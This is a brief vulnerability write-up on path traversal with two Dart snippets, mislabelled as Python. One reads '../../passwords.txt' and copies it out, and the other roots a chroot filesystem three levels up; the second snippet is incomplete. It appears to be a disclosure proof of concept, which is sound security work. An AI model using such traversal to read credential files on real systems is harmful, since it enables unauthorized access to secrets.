Application can allows the attacker to navigate through the file system beyond the intended 
boundaries. This can lead to unauthorized access to sensitive files or directories. 
By manipulating file paths, an attacker can bypass access controls and retrieve or modify critical data, 
such as configuration files, user credentials, or confidential documents. This vulnerability poses 
a significant threat as it enables the attacker to escalate privileges, execute arbitrary code, 
or launch further attacks on the system.


Can expose the content of the passwords file using the following code:

```python
import 'package:file/local.dart';

void main() {
  var file = new LocalFileSystem();
  var f = file.file("../../passwords.txt");
  f.copy("pass.txt");
}
```
Or changing the root of the current running process:
```python
import 'package:file/file.dart';
import 'package:file/chroot.dart';
import 'package:file/local.dart';
import 'package:path/path.dart' as path;

void main() {
  final String root = path.canonicalize("../../..");
  final FileSystem newRoot = new ChrootFileSystem(
  const LocalFileSystem(),
  root,
);
```
